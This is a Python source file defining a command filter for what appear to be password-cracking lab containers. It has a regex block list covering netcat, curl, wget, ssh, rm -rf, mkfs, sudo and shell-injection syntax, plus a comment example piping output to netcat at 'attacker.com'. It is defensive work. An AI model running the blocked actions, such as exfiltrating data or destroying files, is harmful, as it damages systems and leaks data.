# app/services/command_policy.py

import re
from typing import Tuple


class CommandPolicy:
    """
    Enforces command restrictions inside lab containers.
    Supports both global blocking and per-difficulty allowed command lists.
    """

    # ❌ Dangerous patterns — blocked regardless of difficulty
    # These are checked BEFORE the whitelist
    BLOCKED_PATTERNS = [
        r"rm\s+.*-rf",          # rm -rf in any form
        r"rm\s+.*-r",           # rm -r
        r"shutdown",
        r"reboot",
        r"init\s+0",
        r"mkfs",
        r"dd\s+if=",
        r"mount",
        r"umount",
        r"iptables",
        r"ifconfig",
        r"ip\s+addr",
        r"nmap",
        r"curl",                # block all curl (not just http)
        r"wget",                # block all wget
        r"\bnc\b",              # netcat (word boundary to avoid matching 'echo')
        r"netcat",
        r"scp",
        r"\bssh\b",
        r"\bsudo\b",            # ✅ explicitly block sudo
        r"\bsu\b",              # block su too
        r"\bchmod\b",
        r"\bchown\b",
        r"\bpython3?\b",        # ✅ block both python and python3
        r"\bperl\b",
        r"\bruby\b",
        r"\bphp\b",
        r"\bbash\b",            # ✅ block bash explicitly
        r"\bsh\s+-c\b",         # block sh -c "..." execution
        r"\benv\b",             # env can be used to run arbitrary commands
        r"\bexec\b",
        r"\beval\b",
        r">[^>]",               # ✅ block output redirect (e.g. ls > /etc/passwd)
        r"\|",                  # ✅ block pipes (e.g. ls | nc attacker.com)
        r"&&",                  # ✅ block command chaining
        r";",                   # ✅ block command separator abuse
        r"`",                   # ✅ block backtick command substitution
        r"\$\(",                # ✅ block $() command substitution
    ]

    # ✅ Per-difficulty allowed tools (from difficulty_service.py)
    DIFFICULTY_ALLOWED = {
        "beginner":     ["john", "ls", "cat", "cd", "pwd", "echo", "clear", "whoami"],
        "intermediate": ["hashcat", "john", "ls", "cat", "cd", "pwd", "echo", "clear", "whoami"],
        "advanced":     ["hashcat", "john", "ls", "cat", "cd", "pwd", "echo", "clear", "whoami"],
    }

    # Global fallback whitelist (used when no difficulty provided)
    ALLOWED_TOOLS = ["hashcat", "john", "ls", "cat", "cd", "pwd", "echo", "clear", "whoami"]

    @classmethod
    def is_command_allowed(cls, command: str, difficulty: str = None) -> bool:
        """
        Returns True if command is safe to execute.
        Use check_command() for detailed reason.
        """
        allowed, _ = cls.check_command(command, difficulty)
        return allowed

    @classmethod
    def check_command(cls, command: str, difficulty: str = None) -> Tuple[bool, str]:
        """
        ✅ Returns (is_allowed: bool, reason: str).
        Frontend uses reason to show helpful terminal message.

        Args:
            command: The raw command string from the terminal
            difficulty: Optional difficulty level for per-difficulty enforcement

        Returns:
            (True, "ok") if allowed
            (False, "reason message") if blocked
        """
        command = command.strip()

        # Block empty commands
        if not command:
            return False, "Empty command"

        command_lower = command.lower()

        # ✅ Check dangerous patterns first
        for pattern in cls.BLOCKED_PATTERNS:
            if re.search(pattern, command_lower):
                return False, (
                    f"Command blocked: dangerous pattern detected. "
                    f"Allowed tools: {', '.join(cls.ALLOWED_TOOLS)}"
                )

        # ✅ Get base command (first word)
        base_command = command_lower.split()[0]

        # ✅ Per-difficulty whitelist check
        if difficulty and difficulty in cls.DIFFICULTY_ALLOWED:
            allowed_tools = cls.DIFFICULTY_ALLOWED[difficulty]
        else:
            allowed_tools = cls.ALLOWED_TOOLS

        if base_command not in allowed_tools:
            return False, (
                f"'{base_command}' is not allowed in this lab environment. "
                f"Allowed commands: {', '.join(allowed_tools)}"
            )

        return True, "ok"

    @classmethod
    def get_allowed_tools(cls, difficulty: str = None) -> list:
        """Returns list of allowed tools for a difficulty level."""
        if difficulty and difficulty in cls.DIFFICULTY_ALLOWED:
            return cls.DIFFICULTY_ALLOWED[difficulty]
        return cls.ALLOWED_TOOLS